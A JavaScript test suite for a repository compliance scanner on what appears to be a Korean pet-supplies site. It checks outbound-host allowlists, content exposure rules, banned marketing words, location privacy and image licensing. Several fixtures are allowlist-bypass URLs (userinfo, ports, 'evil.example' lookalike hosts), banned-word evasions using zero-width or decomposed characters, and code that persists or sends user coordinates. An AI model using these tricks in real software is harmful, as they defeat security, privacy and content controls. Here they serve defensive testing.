    j(HTTPS, OPENAPI_HOST, ':8443/v1'),
    j(HTTPS, 'u@', OPENAPI_HOST, '/v1'),
    j(HTTPS, OPENAPI_HOST.toUpperCase(), '/v1'),
  ];
  for (const url of badNaver) {
    const res = scan(await makeRoot({ source: (s) => { s[DEV_SEARCH_FILE] = devSearchSrc(url, j(HTTPS, COUPANG_GW_HOST, '/v2/x')); } }));
    assert.equal(res.code, 1, `${url}: ${JSON.stringify(res.json?.findings)}`);
  }
  for (const url of [j(HTTPS, 'shop.example/p'), j(HTTPS, 'x.', COUPANG_GW_HOST, '/v2'), j('htt', 'p://', COUPANG_GW_HOST, '/v2')]) {
    expectFail(scan(await makeRoot({ source: (s) => { s[DEV_SEARCH_FILE] = devSearchSrc(j(HTTPS, OPENAPI_HOST, '/v1'), url); } })), 'C1-FETCH');
  }
});

test('C1-SEEDURL: imageAsset 외부 URL', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].imageAsset = j(HTTPS, 'cdn.x/a.jpg'); } }));
  expectFail(res, 'C1-SEEDURL');
});

test('C1-SEEDURL: source[].url·sourceUrl 외 필드의 http URL', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['supply-items.json'][0].description = j('참고 ', HTTPS, 'shop.ex/p'); } }));
  expectFail(res, 'C1-SEEDURL');
});

// ── C2 거래·자금 ─────────────────────────────────────────────
test('C2-TRADE: 금지 모델', async () => {
  const schema = j('model VetClinic {\n  id String @id\n  lat Float?\n}\nmodel ', 'Pay', 'ment {\n  id String @id\n}\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['server/prisma/schema.prisma'] = schema; } })), 'C2-TRADE');
});

test('C2-TRADE: 금지 라우트', async () => {
  const src = j("router.post('/ad", "option', handler);\n");
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/r.ts'] = src; } })), 'C2-TRADE');
});

test('C2-TRADE: 금지 식별자', async () => {
  const src = j('export const ', 'esc', 'rowId = 1;\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/r.ts'] = src; } })), 'C2-TRADE');
});

test('C2-TRADE: 문자열·주석 속 단어는 통과', async () => {
  const src = j("// ", 'esc', "row 없음\nexport const KEYS = ['", 'settle', "ment'];\n");
  expectClean(scan(await makeRoot({ source: (s) => { s['server/src/r.ts'] = src; } })));
});

test('C2-PRICE: 스키마 가격 컬럼', async () => {
  const schema = j('model VetClinic {\n  id String @id\n  lat Float?\n}\nmodel CuratedProduct {\n  id String @id\n  ', 'pri', 'ce Int\n}\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['server/prisma/schema.prisma'] = schema; } })), 'C2-PRICE');
});

// ── C3 노출 ─────────────────────────────────────────────────
test('C3-QUERY: 노출 모듈 import 없이 콘텐츠 모델 조회', async () => {
  const src = 'export const all = (prisma) => prisma.curatedProduct.findMany();\n';
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/products/repo.ts'] = src; } })), 'C3-QUERY');
});

test('C3-QUERY: 노출 모듈 import 하면 통과, seed/·테스트는 면제', async () => {
  const src = "import { isProductExposable } from '../engine/index.js';\nexport const all = (prisma) => prisma.curatedProduct.findMany();\n";
  const res = scan(await makeRoot({
    source: (s) => {
      s['server/src/products/repo.ts'] = src;
      s['server/src/seed/load.ts'] = 'export const r = (p) => p.curatedProduct.findMany();\n';
    },
  }));
  expectClean(res);
});

test('C3-GUARDTEST: 가드 테스트 부재', async () => {
  expectFail(scan(await makeRoot({ source: (s) => { delete s['server/src/__tests__/guards.test.ts']; } })), 'C3-GUARDTEST');
});

test('C3-OUT-ID: DRAFT 상품 id 가 HTML 에', async () => {
  const res = scan(await makeRoot({
    output: (o) => { o['index.html'] = o['index.html'].replace('</main>', '<p data-ws-id="curatedProducts#cp-002">x</p></main>'); },
  }));
  expectFail(res, 'C3-OUT-ID');
});

test('C3-OUT-ID: 비노출 아이템 requirement 가 ws-data 에', async () => {
  const res = scan(await makeRoot({
    output: (o) => {
      o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace(
        '"requirements":[',
        '"requirements":[{"animalTypeId":"hamster-golden","supplyItemId":"wheel","item":{"id":"wheel","alternativeIds":[]}},',
      );
    },
  }));
  expectFail(res, 'C3-OUT-ID');
});

// D4(Q1): 타입·아이템 id 가 각각은 노출이어도 (타입, 아이템) 쌍이 노출이 아니면 실패.
test('C3-OUT-ID: ws-data requirement 쌍 비노출(각 id 는 노출)', async () => {
  const res = scan(await makeRoot({
    seed: (d) => {
      Object.assign(d['supply-items.json'][1], meta());                // wheel item VERIFIED
      Object.assign(d['supply-requirements.json'][1], { reviewStatus: 'DRAFT' }); // golden×wheel 비노출
      d['care-profiles.json'].push({ id: 'cp-gerbil', name: '저빌 기본', taxonIds: [], facts: {}, careNotes: ['무리'], ...meta({ contentKind: 'CARE' }) });
      d['animal-types.json'].push({
        id: 'gerbil', slug: 'gerbil', group: 'SMALL_MAMMAL', displayName: '저빌', status: 'ACTIVE', aliases: [], taxonId: 'tx-fixture',
        careProfileId: 'cp-gerbil', careOverrides: {}, ...meta({ contentKind: 'CARE' }),
      });
      d['supply-requirements.json'].push({
        id: 'req-gerbil-wheel', careProfileId: 'cp-gerbil', supplyItemId: 'wheel', priority: 'REQUIRED', orderHint: 'BEFORE_ARRIVAL',
        why: '많이 달려요', caution: null, avoid: null, searchKeyword: '저빌 쳇바퀴', minSpec: { rules: [] }, recommendedSpec: { rules: [] }, ...meta(),
      });
    },
    output: (o) => {
      o['hamster/golden/index.html'] = o['hamster/golden/index.html'].replace(
        '"requirements":[',
        '"requirements":[{"animalTypeId":"hamster-golden","supplyItemId":"wheel","item":{"id":"wheel","alternativeIds":[]}},',
      );
    },
  }));
  expectFail(res, 'C3-OUT-ID');
  assert.equal(res.json.exposed.animalTypes, 2);
  assert.equal(res.json.exposed.supplyItems, 2);
  assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && /requirement hamster-golden\|wheel/.test(f.message)));
  assert.ok(!res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && /requirement\.item/.test(f.message)));
});

// Kenny 2026-10-24 K-4 되돌림: Taxon(LEGAL) 미검수·AI_DRAFT 위장·taxonId null 이어도 타입은 노출 — Taxon 만 비노출 집합.
const TAXON_HIDDEN = [
  ['Taxon DRAFT', (d) => Object.assign(d['taxa.json'][0], { reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null })],
  ['Taxon VERIFIED + AI_DRAFT 위장', (d) => Object.assign(d['taxa.json'][0], { reviewerType: 'AI_DRAFT' })],
  ['taxonId null', (d) => Object.assign(d['animal-types.json'][0], { taxonId: null })],
];
const withCatalogTaxon = ({ typeTaxon, profileTaxa }) => (o) => {
  const c = JSON.parse(o['data/catalog.v1.abcd1234.json']);
  if (typeTaxon !== undefined) c.animalTypes[0].taxonId = typeTaxon;
  if (profileTaxa !== undefined) c.careProfiles[0].taxonIds = profileTaxa;
  o['data/catalog.v1.abcd1234.json'] = JSON.stringify(c);
};
for (const [name, inject] of TAXON_HIDDEN) {
  test(`K-4 되돌림: ${name} → 타입 노출 그대로, Taxon 비노출${name === 'taxonId null' ? ', C3-TAXON 만 FAIL(L-1)' : ', 골든 페이지 통과'}`, async () => {
    const res = scan(await makeRoot({ seed: inject }));
    if (name === 'taxonId null') {
      // 보안 71 L-1: 노출 타입은 taxonId 필수(validate R01 의 독립 재확인). 노출 집합 계산 자체는 Taxon 을 보지 않는다.
      expectFail(res, 'C3-TAXON');
      assert.deepEqual([...new Set(rulesOf(res, 'FAIL'))], ['C3-TAXON']);
    } else expectClean(res);
    assert.equal(res.json.exposed.animalTypes, 1);
    assert.equal(res.json.exposed.taxa, 0);
  });
  test(`C3-OUT-ID: ${name} 인데 카탈로그가 Taxon 을 참조하면 FAIL(타입·프로필 각각)`, async () => {
    for (const ref of [{ typeTaxon: 'tx-fixture' }, { profileTaxa: ['tx-fixture'] }]) {
      const res = scan(await makeRoot({ seed: inject, output: withCatalogTaxon(ref) }));
      expectFail(res, 'C3-OUT-ID');
      assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && /Taxon 참조/.test(f.message)), JSON.stringify(ref));
    }
  });
}
test('K-4 되돌림 clean: Taxon VERIFIED 면 카탈로그 Taxon 참조(타입·프로필) 통과, null 참조도 통과', async () => {
  for (const ref of [{ typeTaxon: 'tx-fixture', profileTaxa: ['tx-fixture'] }, { typeTaxon: null, profileTaxa: [] }]) {
    const res = scan(await makeRoot({ output: withCatalogTaxon(ref) }));
    expectClean(res);
    assert.equal(res.json.exposed.taxa, 1);
  }
});
test('C3-OUT-ID: 미존재 Taxon 참조는 FAIL', async () => {
  const res = scan(await makeRoot({ output: withCatalogTaxon({ typeTaxon: 'tx-ghost' }) }));
  expectFail(res, 'C3-OUT-ID');
});

test('C3-OUT-ID: 카탈로그에 비노출 id', async () => {
  const res = scan(await makeRoot({
    output: (o) => {
      const c = JSON.parse(o['data/catalog.v1.abcd1234.json']);
      c.supplyItems.push({ id: 'wheel' });
      o['data/catalog.v1.abcd1234.json'] = JSON.stringify(c);
    },
  }));
  expectFail(res, 'C3-OUT-ID');
});

// M4(감사 54 #5): 프로필 범위 호환 규칙 — 노출 타입의 프로필이면 노출, 비노출·미존재 프로필이면 카탈로그에 있으면 실패.
const scopedRule = (id, careProfileId) => ({
  id, a: 'cage', b: 'cage', careProfileId,
  rules: [{ expr: 'a.floorWcm <= b.floorWcm', onFail: 'CHECK', message: '바닥을 넓게 써요' }],
  ...meta(),
});
const withCatalogRule = (id) => (o) => {
  const c = JSON.parse(o['data/catalog.v1.abcd1234.json']);
  c.compatibilityRules.push({ id });
  o['data/catalog.v1.abcd1234.json'] = JSON.stringify(c);
};

test('M4 clean: 노출 프로필 범위 호환 규칙은 카탈로그에 있어도 통과', async () => {
  const res = scan(await makeRoot({
    seed: (d) => { d['compatibility-rules.json'].push(scopedRule('cr-scoped-ok', 'cp-syrian')); },
    output: withCatalogRule('cr-scoped-ok'),
  }));
  expectClean(res);
});

test('C3-OUT-ID: 비노출(DRAFT) 프로필 범위 호환 규칙이 카탈로그에', async () => {
  const res = scan(await makeRoot({
    seed: (d) => {
      d['care-profiles.json'].push({ id: 'cp-dwarf', name: '드워프 기본', taxonIds: [], facts: {}, careNotes: [], ...meta({ contentKind: 'CARE', reviewStatus: 'DRAFT', reviewerType: 'AI_DRAFT', verifiedBy: null, verifiedAt: null }) });
      d['compatibility-rules.json'].push(scopedRule('cr-scoped-draft', 'cp-dwarf'));
    },
    output: withCatalogRule('cr-scoped-draft'),
  }));
  expectFail(res, 'C3-OUT-ID');
  assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && /compatibilityRules#cr-scoped-draft/.test(f.message)));
});

test('C3-OUT-ID: 미존재 프로필 범위 호환 규칙이 카탈로그에', async () => {
  const res = scan(await makeRoot({
    seed: (d) => { d['compatibility-rules.json'].push(scopedRule('cr-scoped-ghost', 'cp-ghost')); },
    output: withCatalogRule('cr-scoped-ghost'),
  }));
  expectFail(res, 'C3-OUT-ID');
  assert.ok(res.json.findings.some((f) => f.rule === 'C3-OUT-ID' && /compatibilityRules#cr-scoped-ghost/.test(f.message)));
});

test('C3-OUT-ID: 알 수 없는 시드 키 접두사도 실패(fail-closed)', async () => {
  const res = scan(await makeRoot({
    output: (o) => { o['index.html'] = o['index.html'].replace('</main>', '<p data-ws-id="widgets#w1">x</p></main>'); },
  }));
  expectFail(res, 'C3-OUT-ID');
});

test('C3-OUT-ID: override 가 최소 규격을 조이면 상품 비노출', async () => {
  const res = scan(await makeRoot({
    seed: (d) => {
      d['animal-types.json'][0].careOverrides = {
        requirements: { cage: { minSpec: { rules: [{ key: 'floorWcm', op: 'gte', value: 100, reason: 'r' }] } } },
      };
    },
    output: noop,
  }));
  expectFail(res, 'C3-OUT-ID');
});

test('C3-OUT-ID: AI_DRAFT 를 VERIFIED 로 표시한 타입은 비노출', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['animal-types.json'][0].reviewerType = 'AI_DRAFT'; }, output: noop }));
  expectFail(res, 'C3-OUT-ID');
  expectFail(res, 'C3-OUT-ROUTE');
});

// M-1(R4 A1): --now = 노출 기준일. meta().verifiedAt 2026-09-30 + 180 = 2027-03-29(노출), + 181 = 2027-03-30(강등).
test('C3-OUT-ID: --now 기준 180일 이내 노출, 181일째 산출물에 남은 타입·상품은 FAIL', async () => {
  const root = await makeRoot({ output: noop });
  const fresh = scan(root, '--now', '2027-03-29');
  expectClean(fresh);
  assert.equal(fresh.json.asOf, '2027-03-29');
  assert.equal(fresh.json.exposed.animalTypes, 1);
  const stale = scan(root, '--now', '2027-03-30');
  expectFail(stale, 'C3-OUT-ID');
  expectFail(stale, 'C3-OUT-ROUTE');
  assert.equal(stale.json.exposed.animalTypes, 0);
  assert.equal(stale.json.exposed.curatedProducts, 0);
});

test('C3-OUT-ID: 체인의 CareProfile 하나만 오래돼도 비노출(fail-closed)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['care-profiles.json'][0].verifiedAt = '2026-03-31'; }, output: noop }));
  expectFail(res, 'C3-OUT-ID');
  assert.equal(res.json.exposed.animalTypes, 0);
});

test('C3-OUT-ID: verifiedAt 누락·미래 날짜는 비노출', async () => {
  for (const v of [null, '2026-10-02', '2026-02-30']) {
    const res = scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].verifiedAt = v; }, output: noop }));
    expectFail(res, 'C3-OUT-ID');
  }
});

test('--now 형식 오류 → exit 2, 생략 시 로컬 오늘(YYYY-MM-DD)', async () => {
  const root = await makeRoot();
  for (const bad of ['2026-1-1', '2026-02-30', 'today']) assert.equal(scan(root, '--now', bad).code, 2, bad);
  const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--json'], { encoding: 'utf8' });
  assert.match(JSON.parse(r.stdout).asOf, /^\d{4}-\d{2}-\d{2}$/);
});

test('--now 기본값 = 오늘(Asia/Seoul), 러너 TZ 무관(S-R4 L-A)', async () => {
  const { seoulToday } = await import('../lib/dates.mjs');
  assert.equal(seoulToday(new Date('2026-10-01T14:59:59Z')), '2026-10-01');
  assert.equal(seoulToday(new Date('2026-10-01T15:00:00Z')), '2026-10-02');
  const root = await makeRoot();
  for (const tz of ['UTC', 'America/Los_Angeles', 'Pacific/Kiritimati']) {
    const before = seoulToday();
    const r = spawnSync(process.execPath, [SCANNER, '--root', root, '--json'], { encoding: 'utf8', env: { ...process.env, TZ: tz } });
    const after = seoulToday();
    assert.ok([before, after].includes(JSON.parse(r.stdout).asOf), `${tz}: ${JSON.parse(r.stdout).asOf} ≠ ${before}`);
  }
});

test('STALE_DAYS(mjs) = 180, computeExposure 는 asOf 필수', async () => {
  const mod = await import('../lib/seed-exposure.mjs');
  assert.equal(mod.STALE_DAYS, 180);
  assert.throws(() => mod.computeExposure({}, undefined), RangeError);
  assert.throws(() => mod.computeExposure({}, '2026-1-1'), RangeError);
});

test('C3-OUT-ID: 알 수 없는 reviewerType(블록리스트 아님, rank ≥ OPERATOR 허용목록)', async () => {
  for (const bad of ['HUMAN', '', null]) {
    const res = scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].reviewerType = bad; }, output: noop }));
    expectFail(res, 'C3-OUT-ID');
  }
});

test('C3-OUT-ID: 같은 id 중복 행 중 하나라도 비노출이면 비노출', async () => {
  const res = scan(await makeRoot({
    seed: (d) => { d['curated-products.json'].push({ ...d['curated-products.json'][0], reviewStatus: 'DRAFT' }); },
    output: noop,
  }));
  expectFail(res, 'C3-OUT-ID');
});

test('C3-OUT-ROUTE: seedDigest 불일치', async () => {
  const res = scan(await makeRoot({ output: noop, manifest: (dg) => manifestFor(dg.replace(/^./, dg[0] === 'a' ? 'b' : 'a')) }));
  expectFail(res, 'C3-OUT-ROUTE');
});

test('C3-OUT-ROUTE: sitemap 에 manifest indexable 밖 URL', async () => {
  const res = scan(await makeRoot({
    output: (o) => { o['sitemap.xml'] = o['sitemap.xml'].replace('</urlset>', '<url><loc>http://localhost:3001/vet</loc></url></urlset>'); },
  }));
  expectFail(res, 'C3-OUT-ROUTE');
});

test('C3-OUT-ROUTE: DRAFT 타입 페이지', async () => {
  const res = scan(await makeRoot({
    output: noop,
    manifest: (dg) => {
      const m = manifestFor(dg);
      m.routes.push({ path: '/hamster/dwarf', file: 'index.html', kind: 'TYPE', typeId: 'hamster-dwarf', indexable: false });
      return m;
    },
  }));
  expectFail(res, 'C3-OUT-ROUTE');
});

// ── C4 금지어 ───────────────────────────────────────────────
test('C4-BANNED: 시드 제로폭 우회(stripped/spaced 정규화)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['supply-requirements.json'][0].why = j('최', '​', '저가 상품'); } }));
  expectFail(res, 'C4-BANNED');
});

test('C4-BANNED: 시드 NFD 분해형', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['supply-items.json'][0].description = KO.safe.normalize('NFD'); } }));
  expectFail(res, 'C4-BANNED');
});

test('C4-BANNED: 시드 전문가 N명(한글 수사)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['setup-bundles.json'][0].purpose = j(KO.expertN, ' 열 명이 골랐어요'); } }));
  expectFail(res, 'C4-BANNED');
});

test('C4-BANNED: 산출물 가시 텍스트 공백 우회', async () => {
  const spaced = KO.signup.split('').join(' ');
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${spaced}</p></main>`); } }));
  expectFail(res, 'C4-BANNED');
});

test('C4-BANNED: 산출물 alt·meta content·JSON 문자열', async () => {
  for (const mut of [
    (o) => { o['index.html'] = o['index.html'].replace('</main>', `<img src="/assets/a.webp" alt="${KO.best} 케이지"></main>`); },
    (o) => { o['index.html'] = o['index.html'].replace('작은 반려동물 준비', KO.cheapest); },
    (o) => { o['index.html'] = o['index.html'].replace('"data":{', `"note":"${KO.okay}","data":{`); },
  ]) {
    expectFail(scan(await makeRoot({ output: mut })), 'C4-BANNED');
  }
});

test('C4-BANNED: 태그 경계에 걸친 금지어', async () => {
  const [a, b] = [KO.signup.slice(0, 2), KO.signup.slice(2)];
  const res = scan(await makeRoot({ output: (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p><b>${a}</b>${b}</p></main>`); } }));
  expectFail(res, 'C4-BANNED');
});

test('C4-BANNED: 2자 금지어 공백 분리는 WARN 만(exit 0)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['supply-items.json'][0].description = j('가', KO.purchase[0], ' ', KO.purchase[1], '장'); } }));
  expectClean(res);
  assert.ok(rulesOf(res, 'WARN').includes('C4-BANNED'));
});

// R6 B1(SEC-4 L-4): 어간은 산출물·승격된 시드 행에서 FAIL, DRAFT 시드에서 WARN.
const STEM_TEXT = j(KO.safeStem, '망을 둘러요');

test('C4-STEM: VERIFIED 시드 행의 어간 → FAIL(exit 1)', async () => {
  const res = scan(await makeRoot({ seed: (d) => { d['supply-items.json'][0].description = STEM_TEXT; } }));
  expectFail(res, 'C4-STEM');
});

test('C4-STEM: AI_DRAFT 를 VERIFIED 로 위장한 행·VERIFIED 병원·APPROVED 후기도 FAIL', async () => {
  for (const mut of [
    (d) => { Object.assign(d['supply-items.json'][1], { reviewStatus: 'VERIFIED', description: STEM_TEXT }); },
    (d) => { d['vet-clinics.json'][0].name = STEM_TEXT; },
    (d) => { Object.assign(d['testimonials.json'][0], { status: 'APPROVED', quote: STEM_TEXT }); },
  ]) {
    expectFail(scan(await makeRoot({ seed: mut })), 'C4-STEM');
  }
});

test('C4-STEM: DRAFT·SLOT 시드 행의 어간은 WARN 만(exit 0)', async () => {
  const res = scan(await makeRoot({
    seed: (d) => {
      d['supply-items.json'][1].description = STEM_TEXT; // DRAFT
      d['testimonials.json'][0].quote = STEM_TEXT; // SLOT
    },
  }));
  expectClean(res);
  assert.ok(rulesOf(res, 'WARN').includes('C4-STEM'));
});

test('C4-STEM: 산출물 가시 텍스트·JSON 의 어간 → FAIL(exit 1)', async () => {
  for (const mut of [
    (o) => { o['index.html'] = o['index.html'].replace('</main>', `<p>${STEM_TEXT}</p></main>`); },
    (o) => { o['index.html'] = o['index.html'].replace('"data":{', `"note":"${STEM_TEXT}","data":{`); },
  ]) {
    expectFail(scan(await makeRoot({ output: mut })), 'C4-STEM');
  }
});

test('C4-BANNED: 제외 필드(id·url·source.title·verifiedBy·photos.query)는 검사 안 함', async () => {
  const res = scan(await makeRoot({
    seed: (d) => {
      d['supply-items.json'][0].source[0].title = KO.best;
      d['supply-items.json'][0].verifiedBy = KO.best;
      d['photos.json'][0].query = KO.best;
      d['photos.json'][0].scene = KO.best;
    },
  }));
  expectClean(res);
});

test('C4-CODE: client tsx 코드 리터럴 금지어는 FAIL(R4, exit 1)', async () => {
  const src = j('export const Login = () => <button>', KO.signup, "</button>;\nexport const t = '", KO.purchase, "';\n");
  const res = scan(await makeRoot({ source: (s) => { s['client/src/auth/LoginView.tsx'] = src; } }));
  expectFail(res, 'C4-CODE');
  assert.ok(rulesOf(res, 'FAIL').filter((r) => r === 'C4-CODE').length >= 2);
});

test('C4-CODE: server ts 문자열 리터럴 금지어는 FAIL(R4, exit 1)', async () => {
  const src = j("export const msg = '", KO.best, "';\n");
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/msg.ts'] = src; } })), 'C4-CODE');
});

test('C4-CODE: *.test.* · seed/lint.ts · banned-words.json 안의 금지어는 제외', async () => {
  const src = j("export const msg = '", KO.best, "';\n");
  const res = scan(await makeRoot({
    source: (s) => {
      s['client/src/a.test.tsx'] = src;
      s['server/src/__tests__/b.test.ts'] = src;
      s['server/src/seed/lint.ts'] = src;
    },
  }));
  expectClean(res);
  assert.ok(!rulesOf(res).includes('C4-CODE'));
});

// ── C5 위치 ─────────────────────────────────────────────────
test('C5-GEO: 좌표 + localStorage 근접', async () => {
  const src = j('navigator.geolocation.getCurrentPosition((pos) => {\n  const c = pos.coords;\n  local', 'Storage.setItem(\'pos\', JSON.stringify(c));\n});\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/g.ts'] = src; } })), 'C5-GEO');
});

test('C5-GEO: 좌표 + 네트워크 전송 근접', async () => {
  const src = j('const body = { lat: p.lat, lng: p.lng };\n', FETCH, "('/api/where', { method: 'POST', body: JSON.stringify(body) });\n");
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/g.ts'] = src; } })), 'C5-GEO');
});

test('C5-GEO: VetClinic 외 스키마 좌표 컬럼', async () => {
  const schema = 'model VetClinic {\n  id String @id\n  lat Float?\n}\nmodel User {\n  id String @id\n  lat Float\n}\n';
  expectFail(scan(await makeRoot({ source: (s) => { s['server/prisma/schema.prisma'] = schema; } })), 'C5-GEO');
});

test('C5-GEO: vet-clinics.json 외 시드 좌표 키', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['animal-types.json'][0].lat = 37.5; } })), 'C5-GEO');
});

// R5 B3-4(D14): 위치 API 자체가 금지 — 이전의 "메모리 사용은 통과" 는 뒤집혔다. 좌표의 메모리 사용(병원 주소 좌표로 지도 중심)은 통과.
test('C5-GEO: 클라 좌표 메모리 사용(전송·영속 없음)은 통과, 위치 API 로 얻으면 실패', async () => {
  const mem = 'export const center = (vet) => {\n  setCenter(vet.lat, vet.lng);\n};\n';
  expectClean(scan(await makeRoot({ source: (s) => { s['client/src/g.ts'] = mem; } })));
  const src = 'navigator.geolocation.getCurrentPosition((pos) => {\n  setCenter(pos.coords.latitude, pos.coords.longitude);\n});\n';
  expectFail(scan(await makeRoot({ source: (s) => { s['client/src/g.ts'] = src; } })), 'C5-GEO');
});

// ── C6 이미지 ───────────────────────────────────────────────
const CC_BY_URL = j(HTTPS, 'creativecommons.org/licenses/by/4.0/');
const ccByPhoto = (over = {}) => ({
  id: 'ph-02', scene: 'x', slot: 'intro-2', query: 'q', source: 'WIKIMEDIA', license: 'CC_BY', author: 'Jane',
  sourceUrl: j(HTTPS, 'commons.wikimedia.org/wiki/File:p.jpg'), licenseUrl: CC_BY_URL, downloadedAt: '2026-09-30', modified: false, status: 'READY', ...over,
});
/** S1 M-3 — /credits 항목(저작자·증서 링크). */
const CREDIT_ITEM = j('<ul class="ws-credits"><li class="ws-credit" data-ws-id="photos#ph-02"><p>x</p><p>저작자: Jane</p><p>라이선스: <a href="', CC_BY_URL, '" target="_blank" rel="noopener noreferrer nofollow">CC BY 4.0</a></p></li></ul>');
const creditsPage = (o) => o['index.html'].replace('</main>', `${CREDIT_ITEM}</main>`);

test('C6-IMG: CC_BY 사진 author 없음', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ author: null })); } })), 'C6-IMG');
});

test('C6-IMG·C1-SEEDURL: CC_BY licenseUrl 없음·종류 불일치 → C6, 허용목록 밖 licenseUrl → C1-SEEDURL', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ licenseUrl: null })); } })), 'C6-IMG');
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ licenseUrl: j(HTTPS, 'creativecommons.org/licenses/by-sa/4.0/') })); } })), 'C6-IMG');
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ licenseUrl: j(HTTPS, 'evil.example/licenses/by/4.0/') })); } })), 'C1-SEEDURL');
  expectClean(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto()); } })));
});

test('C6-IMG: 라이선스 허용 외 값·http sourceUrl', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ license: 'UNKNOWN' })); } })), 'C6-IMG');
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ sourceUrl: 'http://commons.example.org/p.jpg' })); } })), 'C6-IMG');
});

// L3·M-1·L8(R5 B3-2): C6-IMG 는 isPhotoUsableRow 와 같은 엄격도.
test('C6-IMG: READY 외 상태·출처↔호스트 불일치·userinfo·포트·미정 출처(OWN) → 실패', async () => {
  const bad = [
    { status: 'ACTIVE' },
    { sourceUrl: j(HTTPS, 'www.instagram.com/p/abc/') },
    { sourceUrl: j(HTTPS, 'u@commons.wikimedia.org/wiki/File:p.jpg') },
    { sourceUrl: j(HTTPS, 'commons.wikimedia.org:443/wiki/File:p.jpg') },
    { sourceUrl: j(HTTPS, 'commons.wikimedia.org.evil.example/p.jpg') },
    { source: 'OWN', license: 'PERMISSION', licenseUrl: null },
    { source: 'Wikimedia Commons' },
    { downloadedAt: '2026-02-30' },
  ];
  for (const over of bad) {
    expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto(over)); } })), 'C6-IMG');
  }
});

test('C6-IMG: CC_BY_SA 히어로·합성 슬롯·modified → 실패, 카드 슬롯 원본 → C6 없음', async () => {
  const sa = { license: 'CC_BY_SA', licenseUrl: j(HTTPS, 'creativecommons.org/licenses/by-sa/4.0/') };
  for (const over of [{ slot: 'hero' }, { slot: 'composite-intro' }, { modified: true }]) {
    expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ ...sa, ...over })); } })), 'C6-IMG');
  }
  const ok = scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto({ ...sa, slot: 'l4-cage' })); } }));
  assert.ok(!rulesOf(ok, 'FAIL').includes('C6-IMG'), JSON.stringify(ok.json?.findings));
});

test('C6-IMG: 상품 imageAsset 인데 imageLicense 허용 외', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].imageLicense = 'NONE'; } })), 'C6-IMG');
});

test('C6-IMG: 후기 reviewerImage 동의 없음', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['testimonials.json'][0].reviewerImage = '/assets/reviewers/a.webp'; } })), 'C6-IMG');
});

test('C6-IMG: CC_BY 사진 있는데 /credits 누락', async () => {
  expectFail(scan(await makeRoot({ seed: (d) => { d['photos.json'].push(ccByPhoto()); }, output: noop })), 'C6-IMG');
});

test('C6-IMG: CC_BY 사진 + /credits 페이지 + 모든 페이지 링크 → 통과', async () => {
  const res = scan(await makeRoot({
    seed: (d) => { d['photos.json'].push(ccByPhoto()); },
    output: (o) => {
      for (const k of Object.keys(o)) if (k.endsWith('.html')) o[k] = o[k].replace('</footer>', '<a href="/credits">사진 출처</a></footer>');
      o['credits/index.html'] = creditsPage(o);
    },
    manifest: (dg) => {
      const m = manifestFor(dg);
      m.routes.push({ path: '/credits', file: 'credits/index.html', kind: 'CREDITS', indexable: false });
      return m;
    },
  }));
  expectClean(res);
});

// S1 M-3(R4 A2): /credits 항목에 같은 종류의 증서 링크, CC BY 인데 licenseUrl 없으면 사용 불가.
test('C6-IMG: /credits 에 CC BY 항목·증서 링크 없음 → 실패', async () => {
  const f = creditsFixture();
  const out = f.output;
  f.output = (o) => { out(o); o['credits/index.html'] = o['index.html']; };
  expectFail(scan(await makeRoot(f)), 'C6-IMG');
  const g = creditsFixture();
  const out2 = g.output;
  g.output = (o) => { out2(o); o['credits/index.html'] = o['credits/index.html'].replace(CC_BY_URL, j(HTTPS, 'creativecommons.org/licenses/by-sa/4.0/')); };
  expectFail(scan(await makeRoot(g)), 'C6-IMG');
});

test('C3-OUT-ID: CC_BY 사진에 licenseUrl 없거나 허용목록 밖이면 비노출 — /credits 에 남으면 실패', async () => {
  for (const licenseUrl of [null, j(HTTPS, 'creativecommons.org.evil.example/licenses/by/4.0/'), j(HTTPS, 'creativecommons.org/licenses/by-sa/4.0/')]) {
    const f = creditsFixture();
    f.seed = (d) => { d['photos.json'].push(ccByPhoto({ licenseUrl })); };
    expectFail(scan(await makeRoot(f)), 'C3-OUT-ID');
  }
});

